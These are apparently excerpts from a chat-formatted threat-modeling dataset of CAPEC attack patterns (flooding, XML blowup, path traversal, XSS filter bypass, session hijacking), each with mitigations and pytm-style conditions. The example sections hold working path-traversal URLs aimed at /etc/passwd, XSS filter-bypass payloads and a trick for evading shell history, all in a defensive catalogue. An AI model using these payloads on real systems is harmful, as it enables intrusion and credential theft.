Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.\n\"example\" In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.\n\"mitigations\" Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.\n\"prerequisites\" The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.\n\"references\" https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html\n\"severity\" Medium\n\"target\" [\nProcessServerDatastoreLambda\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.handlesResourceConsumption is False or target.controls.isResilient is False\n\"description\" Flooding\n\"details\" An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.\n\"example\" Adversary tries to bring a network or service down by flooding it with large amounts of traffic.\n\"mitigations\" Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.

Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.\n\"example\" Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.\n\"mitigations\" Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval. Implementation: Provide for network flow control and traffic shaping to control access to the resources.\n\"prerequisites\" The target must receive and process XML transactions.\n\"references\" https://capec.mitre.org/data/definitions/147.html, http://cwe.mitre.org/data/definitions/400.html, http://cwe.mitre.org/data/definitions/770.html\n\"severity\" Medium\n\"target\" [\nDataflow\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.usesXMLParser is False or target.controls.disablesDTD is False\n\"description\" XML Attribute Blowup\n\"details\" This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.\n\"example\" In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). \u003c?xml version=1.0?\u003e\u003cfooaaa=ZZZ=...999=/\u003e A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.\n\"mitigations\" This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.\n\"prerequisites\" The server accepts XML input and is using a parser with a runtime longer than O(n) for the insertion of a new attribute in the data container.(examples are .NET framework 1.0 and 1.1)\n\"references\" https://capec.mitre.org/data/definitions/229.html, http://cwe.mitre.org/data/definitions/770.html\n\"severity\" High\n\"target\" [\nServer\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.checksInputBounds is False or target.controls.validatesInput is False\n\"description\" Filter Failure through Buffer Overflow\n\"details\" In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).\n\"example\" Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.\n\"mitigations\" Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.Pre-design: Use a language or compiler that performs automatic bounds checking.Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.Operational: Use OS-level preventative functionality. Not a complete solution.Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.\n\"prerequisites\" Ability to control the length of data passed to an active filter.\n\"references\" https://capec.mitre.org/data/definitions/24.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/680.html, http://cwe.mitre.org/data/definitions/20.html\n\"severity\" High\n\"target\" [\nProcessLambda\n]\n"},{"role":"user","content":"### Threat\n## ID: 495\n## NAME: UDP Fragmentation\n## Likelihood: \u003cno value\u003e\n## Severity: \u003cno value\u003e\n## Description\nAn attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU.

Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.\\nIn an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.\\n\\n### Threat: Flooding\\nAn adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.\\nAdversary tries to bring a network or service down by flooding it with large amounts of traffic.\\n\\n### Threat: XML Ping of the Death\\nAn attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target.

By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.\n\"example\" A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.\n\"mitigations\" Validation of user input for type, length, data-range, format, etc.\n\"prerequisites\" The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.\n\"references\" https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html\n\"severity\" Medium\n\"target\" [\nProcessLambdaServer\n]\n\n### Example\n\"Likelihood Of Attack\" Medium\n\"condition\" (target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)\n\"description\" Communication Channel Manipulation\n\"details\" An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.\n\"example\" Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.\n\"mitigations\" Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.\n\"prerequisites\" The target application must leverage an open communications channel.The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).\n\"references\" https://capec.mitre.org/data/definitions/216.html\n\"severity\" High\n\"target\" [\nDataflow\n]\n\n### Example\n\"Likelihood Of Attack\" Medium\n\"condition\" target.controls.hasAccessControl is False or target.controls.authorizesSource is False\n\"description\" Functionality Misuse\n\"details\" An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.\n\"example\" An attacker clicks on the 'forgot password' and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.\n\"mitigations\" Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.When implementing security features, consider how they can be misused and compromised.\n\"prerequisites\" The adversary has the capability to interact with the application directly.The target system does not adequately implement safeguards to prevent misuse of authorized actions/processes.\n\"references\" https://capec.mitre.org/data/definitions/212.html\n\"severity\" Medium\n\"target\" [\nServer\n]\n\n### Example\n\"Likelihood Of Attack\" Medium\n\"condition\" target.implementsAPI is True and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)\n\"description\" API Manipulation\n\"details\" An adversary manipulates the use or processing of an Application Programming Interface (API) resulting in an adverse impact upon the security of the system implementing the API. This can allow the adversary to execute functionality not intended by the API implementation, possibly compromising the system which integrates the API. API manipulation can take on a number of forms including forcing the unexpected use of an API, or the use of an API in an unintended way. For example, an adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution. Another example could be API methods that should be disabled in a production application but were not, thus exposing dangerous functionality within a production environment.\n\"example\" Since APIs can be accessed over the internet just like any other URI with some sensitive data attached to the request, they share the vulnerabilities of any other resource accessible on the internet like Man-in-the-middle, CSRF Attack, Denial of Services, etc.\n\"mitigations\" Always use HTTPS and SSL Certificates. Firewall optimizations to prevent unauthorized access to or from a private network. Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API. Use IP whitelisting and rate limiting.\n\"prerequisites\" The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.\n\"references\" https://capec.mitre.org/data/definitions/113.html, http://cwe.mitre.org/data/definitions/227.html\n\"severity\" Medium\n\"target\" [\nProcessLambda\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.usesEnvironmentVariables is True and (target.controls.implementsAuthenticationScheme is False or target.controls.validatesInput is False or target.controls.authorizesSource is False)\n\"description\" Subverting Environment Variable Values\n\"details\" The attacker directly or indirectly modifies environment variables used by or controlling the target software. The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker.\n\"example\" Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the attacker upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as 172.16.2.100shared_filestrojan_dll.dll. See also: Path Manipulation (CVE-1999-0073). The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ignorespace. HISTCONTROL can also be set to ignore duplicate commands by setting it to ignoredups. In some Linux systems, this is set by default to ignoreboth which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.\n\"mitigations\" Protect environment variables against unauthorized read and write access.

A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or ) and/or dots (.)) to reach desired directories or files.\n\"example\" An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.\n\"mitigations\" Design: Configure the access control correctly. Design: Enforce principle of least privilege. Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution. Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host. 6. Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands. Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.\n\"prerequisites\" The attacker must be able to control the path that is requested of the target.The target must fail to adequately sanitize incoming paths\n\"references\" https://capec.mitre.org/data/definitions/126.html, http://cwe.mitre.org/data/definitions/22.html\n\"severity\" Very High\n\"target\" [\nServer\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.validatesInput is False or target.controls.sanitizesInput is False\n\"description\" Relative Path Traversal\n\"details\" An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.\n\"example\" The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.\n\"mitigations\" Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.\n\"prerequisites\" The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.\n\"references\" https://capec.mitre.org/data/definitions/139.html, http://cwe.mitre.org/data/definitions/23.html\n\"severity\" High\n\"target\" [\nServer\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.hasAccessControl is False and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)\n\"description\" File Content Injection\n\"details\" An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.\n\"example\" PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]\n\"mitigations\" Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.Implementation: Virus scanning on hostImplementation: Host integrity monitoring for critical files, directories, and processes.

Data may be shared between multiple applications or between multiple threads of a single application. Data sharing is usually accomplished through mutual access to a single memory location. If an adversary can manipulate this shared data (usually by co-opting one of the applications or threads) the other applications or threads using the shared data will often continue to trust the validity of the compromised shared data and use it in their calculations. This can result in invalid trust assumptions, corruption of additional data through the normal operations of the other users of the shared data, or even cause a crash or compromise of the sharing applications.\n\"example\" Adversary was able to compromise one of the sharing applications or data stores in order to manipulate shared data.\n\"mitigations\" Use strong authentication and authorization mechanisms. Use HTTPS/SSL for communication.\n\"prerequisites\" The target applications (or target application threads) must share data between themselves.The adversary must be able to manipulate some piece of the shared data either directly or indirectly and the other users of the data must accept the changed data as valid. Usually this requires that the adversary be able to compromise one of the sharing applications or threads in order to manipulate the shared data.\n\"references\" https://capec.mitre.org/data/definitions/124.html\n\"severity\" Medium\n\"target\" [\nDatastore\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.sanitizesInput is False or target.controls.validatesInput is False or target.controls.encodesOutput is False\n\"description\" XSS Using Alternate Syntax\n\"details\" An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.\n\"example\" In this example, the attacker tries to get a script executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: \u003cscriscriptpt\u003ealert(1)\u003c/scscriptript\u003e when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., \u003cscript\u003eHERE\u003c/script\u003e). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.\n\"mitigations\" Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcementImplementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.\n\"prerequisites\" Target client software must allow scripting such as JavaScript.\n\"references\" https://capec.mitre.org/data/definitions/199.html, http://cwe.mitre.org/data/definitions/87.html\n\"severity\" High\n\"target\" [\nServer\n]\n"},{"role":"user","content":"### Threat\n## ID: 168\n## NAME: Windows ::DATA Alternate Data Stream\n## Likelihood: \u003cno value\u003e\n## Severity: Medium\n## Description\nAn attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security.

This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.\n\"example\" Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.\n\"mitigations\" Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.\n\"prerequisites\" The target application must leverage an open communications channel.The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).\n\"references\" https://capec.mitre.org/data/definitions/216.html\n\"severity\" High\n\"target\" [\nDataflow\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.implementsServerSideValidation is False and (target.controls.providesIntegrity is False or target.controls.authorizesSource is False)\n\"description\" Exploiting Trust in Client\n\"details\" An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.\n\"example\" Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.\n\"mitigations\" Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.Design: Do not rely on client validation or encoding for security purposes.Design: Utilize digital signatures to increase authentication assurance.Design: Utilize two factor authentication to increase authentication assurance.Implementation: Perform input validation for all remote content.\n\"prerequisites\" Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.\n\"references\" https://capec.mitre.org/data/definitions/22.html, http://cwe.mitre.org/data/definitions/287.html\n\"severity\" High\n\"target\" [\nServer\n]\n\n### Example\n\"Likelihood Of Attack\" High\n\"condition\" target.controls.providesIntegrity is False or target.controls.authenticatesSource is False or target.controls.usesStrongSessionIdentifiers is False\n\"description\" Exploitation of Trusted Credentials\n\"details\" Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes trust other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points. Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers. The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.\n\"example\" Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an attacker to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an attacker to exploit session IDs. A brute force attack involves an attacker repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an attacker can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The attacker can then use these variables and access the application.\n\"mitigations\" Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.Implementation: If the session identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.Implementation: If the web or application server supports it, then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.Design: Use strong session identifiers that are protected in transit and at rest.Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.Implementation: Verify of authenticity of all session IDs at runtime.\n\"prerequisites\" Server software must rely on weak session IDs proof and/or verification schemes\n\"references\" https://capec.mitre.org/data/definitions/21.html, http://cwe.mitre.org/data/definitions/290.html, http://cwe.mitre.org/data/definitions/346.html, http://cwe.mitre.org/data/definitions/664.html\n\"severity\" High\n\"target\" [\nServer\n]\n\n### Example\n\"Likelihood Of Attack\" \n\"condition\" (target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False\n\"description\" Sniffing Attacks\n\"details\" In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.\n\"example\" Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.\n\"mitigations\" Encrypt sensitive information when transmitted on insecure mediums to prevent interception.\n\"prerequisites\" The target data stream must be transmitted on a medium to which the adversary has access.\n\"references\" https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html\n\"severity\" Medium\n\"target\" [\nDataflow\n]\n\n### Example\n\"Likelihood Of Attack\" Medium\n\"condition\" not target.controls.isEncrypted or target.tlsVersion \u003c target.sink.minTLSVersion\n\"description\" Client-Server Protocol Manipulation\n\"details\" An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.\n\"example\" An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.\n\"mitigations\" Use strong authentication protocols.\n\"prerequisites\" The client and/or server must utilize a protocol that has a weakness allowing manipulation of the 